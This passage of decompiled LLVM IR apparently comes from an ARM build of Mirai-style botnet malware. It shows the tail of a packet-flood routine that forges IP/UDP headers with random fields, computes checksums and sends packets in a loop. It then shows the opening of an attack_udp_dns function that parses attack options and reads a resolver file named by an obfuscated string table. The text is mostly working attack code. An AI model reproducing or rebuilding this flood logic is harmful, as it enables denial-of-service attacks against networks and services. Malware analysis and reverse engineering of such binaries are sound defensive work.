  %v4_bf74 = inttoptr i32 %v3_bf74 to i8*
  store i8 %v5_bde8, i8* %v4_bf74, align 1
  %v3_bf78 = load i32, i32* %stack_var_-48, align 4
  %v3_bf7c = mul i32 %v3_bf78, 65536
  %v1_bf80 = add i32 %v3_bf7c, 2097152
  %v3_bf84 = udiv i32 %v1_bf80, 256
  %v4_bf8c = udiv i32 %v1_bf80, 16777216
  %v5_bf8c = or i32 %v3_bf84, %v4_bf8c
  %v3_bf90 = urem i32 %v3_bf78, 65536
  store i32 %v3_bf90, i32* %r2.global-to-local, align 4
  %v1_bf94 = trunc i32 %v5_bf8c to i16
  %v2_bf94 = load i32, i32* @lr, align 4
  %v3_bf94 = add i32 %v2_bf94, 2
  %v4_bf94 = inttoptr i32 %v3_bf94 to i16*
  store i16 %v1_bf94, i16* %v4_bf94, align 2
  %v0_bf98 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf98 = mul i32 %v0_bf98, 65536
  %v3_bfa0 = add i32 %v1_bf98, 786432
  store i32 %v3_bfa0, i32* %r2.global-to-local, align 4
  store i32 %v1_be30, i32* %ip.global-to-local, align 4
  %v2_bfa8 = load i32, i32* @lr, align 4
  %v3_bfa8 = add i32 %v2_bfa8, 8
  %v4_bfa8 = inttoptr i32 %v3_bfa8 to i8*
  store i8 %v1_bfa8, i8* %v4_bfa8, align 1
  %v0_bfac = load i32, i32* %r2.global-to-local, align 4
  %v3_bfac = udiv i32 %v0_bfac, 256
  %v1_bfb0 = and i32 %v3_bfac, 65280
  %v0_bfb4 = load i32, i32* %ip.global-to-local, align 4
  %v2_bfb4 = icmp eq i32 %v0_bfb4, 0
  store i1 %v2_bfb4, i1* %cpsr_z.global-to-local, align 1
  %v4_bfb8 = udiv i32 %v0_bfac, 16777216
  %v5_bfb8 = or i32 %v1_bfb0, %v4_bfb8
  store i32 %v5_bfb8, i32* %ip.global-to-local, align 4
  %v2_bfc0 = load i32, i32* @lr, align 4
  %v3_bfc0 = add i32 %v2_bfc0, 9
  %v4_bfc0 = inttoptr i32 %v3_bfc0 to i8*
  store i8 17, i8* %v4_bfc0, align 1
  store i32 ptrtoint (i32* @global_var_24a4c.59 to i32), i32* %r3.global-to-local, align 4
  %v0_bfc8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bfc8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bf24
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_bfcc = load i32, i32* @lr, align 4
  %v4_bfcc = add i32 %v3_bfcc, 6
  %v5_bfcc = inttoptr i32 %v4_bfcc to i16*
  store i16 64, i16* %v5_bfcc, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bf24, %bb
  %v2_bfd0 = load i32, i32* @global_var_24a4c.59, align 4
  %v1_bfd4 = load i32, i32* @lr, align 4
  %v2_bfd4 = add i32 %v1_bfd4, 12
  %v3_bfd4 = inttoptr i32 %v2_bfd4 to i32*
  store i32 %v2_bfd0, i32* %v3_bfd4, align 4
  store i32 %v2_bf40, i32* %r2.global-to-local, align 4
  %v1_bfdc = add i32 %v2_bf40, 16
  %v2_bfdc = inttoptr i32 %v1_bfdc to i32*
  %v3_bfdc = load i32, i32* %v2_bfdc, align 4
  %v1_bfe0 = load i32, i32* @lr, align 4
  %v2_bfe0 = add i32 %v1_bfe0, 16
  %v3_bfe0 = inttoptr i32 %v2_bfe0 to i32*
  store i32 %v3_bfdc, i32* %v3_bfe0, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_bfe8 = load i32, i32* @lr, align 4
  %v1_bfe8 = add i32 %v0_bfe8, 20
  store i32 %v1_bfe8, i32* %r4.global-to-local, align 4
  %v2_bfec = add i32 %v0_bfe8, 28
  %v3_bfec = inttoptr i32 %v2_bfec to i32*
  store i32 -1, i32* %v3_bfec, align 4
  %v0_bff0 = load i32, i32* @r5, align 4
  %v1_bff0 = trunc i32 %v0_bff0 to i16
  %v2_bff0 = load i32, i32* @lr, align 4
  %v3_bff0 = add i32 %v2_bff0, 4
  %v4_bff0 = inttoptr i32 %v3_bff0 to i16*
  store i16 %v1_bff0, i16* %v4_bff0, align 2
  %v0_bff4 = load i32, i32* @lr, align 4
  %v1_bff4 = add i32 %v0_bff4, 32
  %v0_bff8 = load i32, i32* %ip.global-to-local, align 4
  %v1_bff8 = trunc i32 %v0_bff8 to i16
  %v2_bff8 = load i32, i32* %r4.global-to-local, align 4
  %v3_bff8 = add i32 %v2_bff8, 4
  %v4_bff8 = inttoptr i32 %v3_bff8 to i16*
  store i16 %v1_bff8, i16* %v4_bff8, align 2
  %v0_bffc = load i32, i32* @r7, align 4
  %v1_bffc = trunc i32 %v0_bffc to i16
  %v2_bffc = load i32, i32* %r4.global-to-local, align 4
  %v3_bffc = add i32 %v2_bffc, 2
  %v4_bffc = inttoptr i32 %v3_bffc to i16*
  store i16 %v1_bffc, i16* %v4_bffc, align 2
  %v0_c000 = load i32, i32* @r6, align 4
  %v1_c000 = trunc i32 %v0_c000 to i16
  %v2_c000 = load i32, i32* @lr, align 4
  %v3_c000 = add i32 %v2_c000, 20
  %v4_c000 = inttoptr i32 %v3_c000 to i16*
  store i16 %v1_c000, i16* %v4_c000, align 2
  %v3_c004 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c004, i32* %r2.global-to-local, align 4
  %v3_c008 = call i32 @util_memcpy(i32 %v1_bff4, i32 %v3_be7c, i32 %v3_c004)
  %v3_c00c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c00c, i32* %r3.global-to-local, align 4
  %v1_c010 = add i32 %v3_c00c, 1
  store i32 %v1_c010, i32* @r4, align 4
  %v1_c014 = load i32, i32* @r8, align 4
  %v9_c014 = icmp eq i32 %v1_c010, %v1_c014
  store i1 %v9_c014, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c010, i32* %stack_var_-44, align 4
  %v5_c01c = icmp slt i32 %v1_c010, %v1_c014
  br i1 %v5_c01c, label %dec_label_pc_bf24, label %dec_label_pc_c020.preheader

dec_label_pc_c020.preheader:                      ; preds = %.thread, %dec_label_pc_bec8
  %v0_c024.ph = phi i32 [ 0, %dec_label_pc_bec8 ], [ %v1_c014, %.thread ]
  %v3_c060 = icmp eq i32 %v3_bed8, 65535
  br label %dec_label_pc_c020

dec_label_pc_c020:                                ; preds = %dec_label_pc_c020, %dec_label_pc_c10c, %dec_label_pc_c020.preheader
  %v0_c024 = phi i32 [ %v0_c024.ph, %dec_label_pc_c020.preheader ], [ 0, %dec_label_pc_c10c ], [ 0, %dec_label_pc_c020 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c024 = icmp eq i32 %v0_c024, 0
  store i1 %v2_c024, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c024, label %dec_label_pc_c020, label %dec_label_pc_c030

dec_label_pc_c030:                                ; preds = %dec_label_pc_c020, %dec_label_pc_c10c
  br label %dec_label_pc_c034

dec_label_pc_c034:                                ; preds = %dec_label_pc_c080, %dec_label_pc_c030
  %v1_c044 = phi i32 [ %v1_c0fc, %dec_label_pc_c080 ], [ 0, %dec_label_pc_c030 ]
  %v5_c038 = mul i32 %v1_c044, 24
  %v1_c03c = load i32, i32* @sl, align 4
  %v2_c03c = add i32 %v1_c03c, %v5_c038
  store i32 %v2_c03c, i32* %r3.global-to-local, align 4
  %v1_c040 = add i32 %v2_c03c, 20
  %v2_c040 = inttoptr i32 %v1_c040 to i8*
  %v3_c040 = load i8, i8* %v2_c040, align 1
  %v4_c040 = zext i8 %v3_c040 to i32
  store i32 %v4_c040, i32* %r2.global-to-local, align 4
  %v0_c044 = load i32, i32* @fp, align 4
  %v4_c044 = mul i32 %v1_c044, 4
  %v5_c044 = add i32 %v0_c044, %v4_c044
  %v6_c044 = inttoptr i32 %v5_c044 to i32*
  %v7_c044 = load i32, i32* %v6_c044, align 4
  store i32 %v7_c044, i32* @r5, align 4
  %v7_c04c = icmp eq i8 %v3_c040, 31
  store i1 %v7_c04c, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_c054 = add i32 %v7_c044, 20
  store i32 %v1_c054, i32* @r6, align 4
  %tmp39 = icmp ult i8 %v3_c040, 32
  br i1 %tmp39, label %dec_label_pc_c120, label %dec_label_pc_c05c

dec_label_pc_c05c:                                ; preds = %dec_label_pc_c034
  store i32 %v3_bed8, i32* %r3.global-to-local, align 4
  store i1 %v3_c060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c060, label %dec_label_pc_c180, label %dec_label_pc_c068

dec_label_pc_c068:                                ; preds = %dec_label_pc_c120, %dec_label_pc_c05c
  %v1_c06c = phi i32 [ %v1_c178, %dec_label_pc_c120 ], [ 65535, %dec_label_pc_c05c ]
  store i32 %v3_bedc, i32* %ip.global-to-local, align 4
  %v9_c06c = icmp eq i32 %v3_bedc, %v1_c06c
  store i1 %v9_c06c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c06c, label %dec_label_pc_c194, label %dec_label_pc_c074

dec_label_pc_c074:                                ; preds = %dec_label_pc_c180.dec_label_pc_c074_crit_edge, %dec_label_pc_c068
  %v1_c078 = phi i32 [ %v1_c078.pre, %dec_label_pc_c180.dec_label_pc_c074_crit_edge ], [ %v1_c06c, %dec_label_pc_c068 ]
  %v9_c078 = icmp eq i32 %v3_bee0, %v1_c078
  store i1 %v9_c078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c078, label %dec_label_pc_c1a8, label %dec_label_pc_c080

dec_label_pc_c080:                                ; preds = %dec_label_pc_c194, %dec_label_pc_c074, %dec_label_pc_c1a8
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c084 = load i32, i32* @r5, align 4
  %v3_c084 = add i32 %v2_c084, 10
  %v4_c084 = inttoptr i32 %v3_c084 to i16*
  store i16 0, i16* %v4_c084, align 2
  %v0_c08c = load i32, i32* @r5, align 4
  store i32 %v0_c08c, i32* @r0, align 4
  %v2_c090 = call i32 @checksum_generic(i32 %v0_c08c, i32 20)
  %v3_c090 = trunc i32 %v2_c090 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c098 = load i32, i32* @r5, align 4
  %v4_c098 = add i32 %v3_c098, 10
  %v5_c098 = inttoptr i32 %v4_c098 to i16*
  store i16 %v3_c090, i16* %v5_c098, align 2
  %v0_c09c = load i32, i32* %r3.global-to-local, align 4
  %v1_c09c = trunc i32 %v0_c09c to i16
  %v2_c09c = load i32, i32* @r6, align 4
  %v3_c09c = add i32 %v2_c09c, 6
  %v4_c09c = inttoptr i32 %v3_c09c to i16*
  store i16 %v1_c09c, i16* %v4_c09c, align 2
  %v3_c0a0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c0a0, i32* %r3.global-to-local, align 4
  %v0_c0a4 = load i32, i32* @r6, align 4
  store i32 %v0_c0a4, i32* @r1, align 4
  %v1_c0a8 = add i32 %v0_c0a4, 4
  %v2_c0a8 = inttoptr i32 %v1_c0a8 to i16*
  %v3_c0a8 = load i16, i16* %v2_c0a8, align 2
  %v4_c0a8 = zext i16 %v3_c0a8 to i32
  store i32 %v4_c0a8, i32* %r2.global-to-local, align 4
  %v1_c0ac = add i32 %v3_c0a0, 12
  store i32 %v1_c0ac, i32* %r3.global-to-local, align 4
  %v0_c0b0 = load i32, i32* @r5, align 4
  %v4_c0b4 = call i32 @checksum_tcpudp(i32 %v0_c0b0, i32 %v0_c0a4, i32 %v4_c0a8, i32 %v1_c0ac)
  %v5_c0b4 = trunc i32 %v4_c0b4 to i16
  %v3_c0b8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0b8, i32* %r3.global-to-local, align 4
  %v3_c0bc = mul i32 %v3_c0b8, 32
  store i32 %v3_c0bc, i32* %lr.global-to-local, align 4
  %v3_c0c0 = load i32, i32* @r6, align 4
  %v4_c0c0 = add i32 %v3_c0c0, 6
  %v5_c0c0 = inttoptr i32 %v4_c0c0 to i16*
  store i16 %v5_c0b4, i16* %v5_c0c0, align 2
  %v0_c0c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_c0c4 = load i32, i32* %r3.global-to-local, align 4
  %tmp40 = mul i32 %v1_c0c4, -8
  %v5_c0c4 = add i32 %v0_c0c4, %tmp40
  store i32 %v5_c0c4, i32* %lr.global-to-local, align 4
  %v0_c0c8 = load i32, i32* @r6, align 4
  %v1_c0c8 = add i32 %v0_c0c8, 2
  %v2_c0c8 = inttoptr i32 %v1_c0c8 to i16*
  %v3_c0c8 = load i16, i16* %v2_c0c8, align 2
  %v4_c0c8 = zext i16 %v3_c0c8 to i32
  store i32 %v4_c0c8, i32* @r6, align 4
  %v3_c0cc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_c0cc, i32* %r2.global-to-local, align 4
  %v1_c0d0 = load i32, i32* @sl, align 4
  %v2_c0d0 = add i32 %v1_c0d0, %v5_c0c4
  store i32 %v2_c0d0, i32* @lr, align 4
  %v3_c0d4 = add i32 %v2_c0d0, 2
  %v4_c0d4 = inttoptr i32 %v3_c0d4 to i16*
  store i16 %v3_c0c8, i16* %v4_c0d4, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c0e0 = load i32, i32* @r5, align 4
  %v0_c0e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c0e4 = add i32 %v0_c0e4, 32
  store i32 %v1_c0e4, i32* %r2.global-to-local, align 4
  %v0_c0e8 = load i32, i32* @sb, align 4
  %v0_c0ec = load i32, i32* @lr, align 4
  %v6_c0f4 = call i32 @__libc_sendto(i32 %v0_c0e8, i32 %v0_c0e0, i32 %v1_c0e4, i32 16384, i32 %v0_c0ec, i32 16)
  %v3_c0f8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c0f8, i32* %r3.global-to-local, align 4
  %v1_c0fc = add i32 %v3_c0f8, 1
  %v1_c100 = load i32, i32* @r8, align 4
  %v9_c100 = icmp eq i32 %v1_c0fc, %v1_c100
  store i1 %v9_c100, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c0fc, i32* %stack_var_-44, align 4
  %v5_c108 = icmp slt i32 %v1_c0fc, %v1_c100
  br i1 %v5_c108, label %dec_label_pc_c034, label %dec_label_pc_c10c

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c080
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c110 = icmp eq i32 %v1_c100, 0
  store i1 %v2_c110, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c110, label %dec_label_pc_c020, label %dec_label_pc_c030

dec_label_pc_c120:                                ; preds = %dec_label_pc_c034
  %v1_c120 = add i32 %v2_c03c, 16
  %v2_c120 = inttoptr i32 %v1_c120 to i32*
  %v3_c120 = load i32, i32* %v2_c120, align 4
  store i32 %v3_c120, i32* @r4, align 4
  %v0_c124 = call i32 @rand_next()
  %v3_c128 = load i32, i32* %stack_var_-44, align 4
  %v5_c130 = mul i32 %v3_c128, 24
  %v0_c134 = load i32, i32* @r4, align 4
  %v1_c134 = and i32 %v0_c134, 16711680
  store i32 %v1_c134, i32* %ip.global-to-local, align 4
  %v3_c138 = udiv i32 %v0_c134, 16777216
  %v4_c13c = udiv i32 %v1_c134, 256
  %v5_c13c = or i32 %v4_c13c, %v3_c138
  store i32 %v5_c13c, i32* %r2.global-to-local, align 4
  %v1_c140 = load i32, i32* @sl, align 4
  %v2_c140 = add i32 %v1_c140, %v5_c130
  %v1_c144 = and i32 %v0_c134, 65280
  store i32 %v1_c144, i32* %r3.global-to-local, align 4
  %v1_c148 = add i32 %v2_c140, 20
  %v2_c148 = inttoptr i32 %v1_c148 to i8*
  %v3_c148 = load i8, i8* %v2_c148, align 1
  %v4_c148 = zext i8 %v3_c148 to i32
  store i32 %v4_c148, i32* %ip.global-to-local, align 4
  %v5_c150 = call i32 @llvm.bswap.i32(i32 %v0_c134)
  %v7_c154 = lshr i32 %v0_c124, %v4_c148
  %v8_c154 = add i32 %v7_c154, %v5_c150
  store i32 %v8_c154, i32* %r2.global-to-local, align 4
  %v5_c16c = call i32 @llvm.bswap.i32(i32 %v8_c154)
  %v1_c170 = load i32, i32* @r5, align 4
  %v2_c170 = add i32 %v1_c170, 16
  %v3_c170 = inttoptr i32 %v2_c170 to i32*
  store i32 %v5_c16c, i32* %v3_c170, align 4
  store i32 %v3_bed8, i32* %r3.global-to-local, align 4
  %v1_c178 = load i32, i32* @r7, align 4
  %v9_c178 = icmp eq i32 %v3_bed8, %v1_c178
  store i1 %v9_c178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c178, label %dec_label_pc_c180, label %dec_label_pc_c068

dec_label_pc_c180:                                ; preds = %dec_label_pc_c120, %dec_label_pc_c05c
  %v0_c180 = call i32 @rand_next()
  %v1_c180 = trunc i32 %v0_c180 to i16
  store i32 %v3_bedc, i32* %ip.global-to-local, align 4
  %v1_c188 = load i32, i32* @r7, align 4
  %v9_c188 = icmp eq i32 %v3_bedc, %v1_c188
  store i1 %v9_c188, i1* %cpsr_z.global-to-local, align 1
  %v3_c18c = load i32, i32* @r5, align 4
  %v4_c18c = add i32 %v3_c18c, 4
  %v5_c18c = inttoptr i32 %v4_c18c to i16*
  store i16 %v1_c180, i16* %v5_c18c, align 2
  br i1 %v9_c188, label %dec_label_pc_c194, label %dec_label_pc_c180.dec_label_pc_c074_crit_edge

dec_label_pc_c180.dec_label_pc_c074_crit_edge:    ; preds = %dec_label_pc_c180
  %v1_c078.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_c074

dec_label_pc_c194:                                ; preds = %dec_label_pc_c180, %dec_label_pc_c068
  %v0_c194 = call i32 @rand_next()
  %v1_c194 = trunc i32 %v0_c194 to i16
  %v1_c19c = load i32, i32* @r7, align 4
  %v9_c19c = icmp eq i32 %v3_bee0, %v1_c19c
  store i1 %v9_c19c, i1* %cpsr_z.global-to-local, align 1
  %v3_c1a0 = load i32, i32* @r5, align 4
  %v4_c1a0 = add i32 %v3_c1a0, 20
  %v5_c1a0 = inttoptr i32 %v4_c1a0 to i16*
  store i16 %v1_c194, i16* %v5_c1a0, align 2
  br i1 %v9_c19c, label %dec_label_pc_c1a8, label %dec_label_pc_c080

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c194, %dec_label_pc_c074
  %v0_c1a8 = call i32 @rand_next()
  %v1_c1a8 = trunc i32 %v0_c1a8 to i16
  %v3_c1ac = load i32, i32* @r6, align 4
  %v4_c1ac = add i32 %v3_c1ac, 2
  %v5_c1ac = inttoptr i32 %v4_c1ac to i16*
  store i16 %v1_c1a8, i16* %v5_c1ac, align 2
  br label %dec_label_pc_c080

dec_label_pc_c1b4:                                ; preds = %dec_label_pc_bea0
  %v0_c1b4 = load i32, i32* @sb, align 4
  %v1_c1b8 = call i32 @__GI___libc_close(i32 %v0_c1b4)
  br label %dec_label_pc_c1bc

dec_label_pc_c1bc:                                ; preds = %entry, %dec_label_pc_c1b4
  %v1_c1c4 = phi i32 [ %v3_be90, %entry ], [ %v1_c1b8, %dec_label_pc_c1b4 ]
  store i32 %v3_bd94, i32* %r4.global-to-local, align 4
  store i32 %v27_bd94, i32* %lr.global-to-local, align 4
  ret i32 %v1_c1c4

; uselistorder directives
  uselistorder i32 %v1_c178, { 1, 0 }
  uselistorder i32 %v0_c134, { 1, 2, 0, 3 }
  uselistorder i32 %v1_c0fc, { 2, 0, 3, 1 }
  uselistorder i32 %v5_c0c4, { 1, 0 }
  uselistorder i1 %v3_c060, { 1, 0 }
  uselistorder i32 %v1_c010, { 1, 0, 2, 3 }
  uselistorder i32 %v3_bf78, { 1, 0 }
  uselistorder i32 %v3_bf10, { 1, 0 }
  uselistorder i32 %v3_bf0c, { 1, 0 }
  uselistorder i32 %v0_bed0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_becc, { 1, 0, 2 }
  uselistorder i32 %v0_bec8, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bec0, { 1, 0 }
  uselistorder i1 %v7_be94, { 1, 0 }
  uselistorder i32 %v3_be90, { 1, 2, 3, 0 }
  uselistorder i32 %v1_be30, { 1, 2, 0 }
  uselistorder i32 %v5_be24, { 1, 0 }
  uselistorder i32 %v6_bdc8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c1bc, { 1, 0 }
  uselistorder label %dec_label_pc_c080, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c030, { 1, 0 }
  uselistorder label %dec_label_pc_c020, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_c1cc = load i32, i32* @sb, align 4
  %v27_c1cc = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_c1ec = call i32 @calloc(i32 %arg1, i32 4)
  %v0_c1f0 = load i32, i32* @r5, align 4
  store i32 %v0_c1f0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_c1fc = load i32, i32* @r4, align 4
  store i32 %v0_c1fc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_c204 = inttoptr i32 %v0_c1f0 to i32*
  %v6_c204 = call i32 @attack_get_opt_int(i32 %v0_c1fc, i32* %v5_c204, i32 2, i32 0, i32 %v2_c1ec)
  %v1_c210 = urem i32 %v6_c204, 256
  store i32 %v1_c210, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c21c = load i32, i32* @r4, align 4
  store i32 %v0_c21c, i32* %r0.global-to-local, align 4
  %v0_c220 = load i32, i32* @r5, align 4
  store i32 %v0_c220, i32* %r1.global-to-local, align 4
  %sext22 = mul i32 %v6_c204, 16777216
  %v5_c228 = sdiv i32 %sext22, 16777216
  %v6_c228 = inttoptr i32 %v0_c220 to i32*
  %v7_c228 = call i32 @attack_get_opt_int(i32 %v0_c21c, i32* %v6_c228, i32 3, i32 65535, i32 %v5_c228)
  %v0_c22c = load i32, i32* @r5, align 4
  store i32 %v0_c22c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_c238 = load i32, i32* @r4, align 4
  store i32 %v0_c238, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_c240 = inttoptr i32 %v0_c22c to i32*
  %v6_c240 = call i32 @attack_get_opt_int(i32 %v0_c238, i32* %v5_c240, i32 4, i32 64, i32 %v7_c228)
  %v1_c248 = urem i32 %v6_c240, 256
  store i32 %v1_c248, i32* %ip.global-to-local, align 4
  %v0_c24c = load i32, i32* @r5, align 4
  store i32 %v0_c24c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c258 = load i32, i32* @r4, align 4
  store i32 %v0_c258, i32* %r0.global-to-local, align 4
  %sext23 = mul i32 %v6_c240, 16777216
  %v5_c260 = sdiv i32 %sext23, 16777216
  %v6_c260 = inttoptr i32 %v0_c24c to i32*
  %v7_c260 = call i32 @attack_get_opt_int(i32 %v0_c258, i32* %v6_c260, i32 5, i32 0, i32 %v5_c260)
  %v1_c26c = urem i32 %v7_c260, 256
  store i32 %v1_c26c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c278 = load i32, i32* @r4, align 4
  store i32 %v0_c278, i32* %r0.global-to-local, align 4
  %v0_c27c = load i32, i32* @r5, align 4
  store i32 %v0_c27c, i32* %r1.global-to-local, align 4
  %v5_c284 = inttoptr i32 %v0_c27c to i32*
  %v6_c284 = call i32 @attack_get_opt_int(i32 %v0_c278, i32* %v5_c284, i32 6, i32 65535, i32 %v1_c26c)
  %v0_c288 = load i32, i32* @r5, align 4
  store i32 %v0_c288, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c294 = load i32, i32* @r4, align 4
  store i32 %v0_c294, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_c29c = inttoptr i32 %v0_c288 to i32*
  %v6_c29c = call i32 @attack_get_opt_int(i32 %v0_c294, i32* %v5_c29c, i32 7, i32 53, i32 %v6_c284)
  %v0_c2a8 = load i32, i32* @r5, align 4
  store i32 %v0_c2a8, i32* %r1.global-to-local, align 4
  %v0_c2ac = load i32, i32* @r4, align 4
  store i32 %v0_c2ac, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_c2b8 = inttoptr i32 %v0_c2a8 to i32*
  %v6_c2b8 = call i32 @attack_get_opt_int(i32 %v0_c2ac, i32* %v5_c2b8, i32 9, i32 65535, i32 %v6_c29c)
  %v0_c2bc = load i32, i32* @r5, align 4
  store i32 %v0_c2bc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_c2c8 = load i32, i32* @r4, align 4
  store i32 %v0_c2c8, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_c2d0 = inttoptr i32 %v0_c2bc to i32*
  %v6_c2d0 = call i32 @attack_get_opt_int(i32 %v0_c2c8, i32* %v5_c2d0, i32 0, i32 12, i32 %v6_c2b8)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2dc = load i32, i32* @r5, align 4
  store i32 %v0_c2dc, i32* %r1.global-to-local, align 4
  store i32 %v6_c2d0, i32* %sb.global-to-local, align 4
  %v0_c2e4 = load i32, i32* @r4, align 4
  store i32 %v0_c2e4, i32* %r0.global-to-local, align 4
  %v4_c2e8 = inttoptr i32 %v0_c2dc to i32*
  %v5_c2e8 = call i32 @attack_get_opt_str(i32 %v0_c2e4, i32* %v4_c2e8, i32 8, i32 0)
  store i32 %v5_c2e8, i32* @r7, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_c2f4 = call i32 @table_unlock_val(i32 23)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v3_c300 = call i32 @table_retrieve_val(i32 23, i32* null)
  store i32 %v3_c300, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_c308 = call i32 @__libc_open(i32 %v3_c300, i32* null)
  store i32 %v3_c308, i32* @r4, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_c314 = call i32 @table_lock_val(i32 23)
  store i32 %v1_c314, i32* %r0.global-to-local, align 4
  %v0_c318 = load i32, i32* @r4, align 4
  %v1_c318 = icmp slt i32 %v0_c318, 0
  %v2_c318 = icmp eq i32 %v0_c318, 0
  store i1 %v2_c318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_c318, label %dec_label_pc_c814, label %dec_label_pc_c320

dec_label_pc_c320:                                ; preds = %entry
  %v2_c324 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_c324, i32* @sl, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_c324, i32* @r1, align 4
  store i32 %v0_c318, i32* %r0.global-to-local, align 4
  %v1_c334 = call i32 @__libc_read(i32 %v0_c318)
  store i32 %v1_c334, i32* @r5, align 4
  %v0_c33c = load i32, i32* @r4, align 4
  store i32 %v0_c33c, i32* %r0.global-to-local, align 4
  %v1_c340 = call i32 @__GI___libc_close(i32 %v0_c33c)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_c348 = call i32 @table_unlock_val(i32 24)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_c354 = call i32 @table_retrieve_val(i32 24, i32* null)
  %v0_c358 = load i32, i32* @r5, align 4
  store i32 %v0_c358, i32* @r1, align 4
  store i32 %v3_c354, i32* %r2.global-to-local, align 4
  store i32 %v2_c324, i32* %r0.global-to-local, align 4
  %v3_c364 = bitcast i32* %stack_var_-2124 to i8*
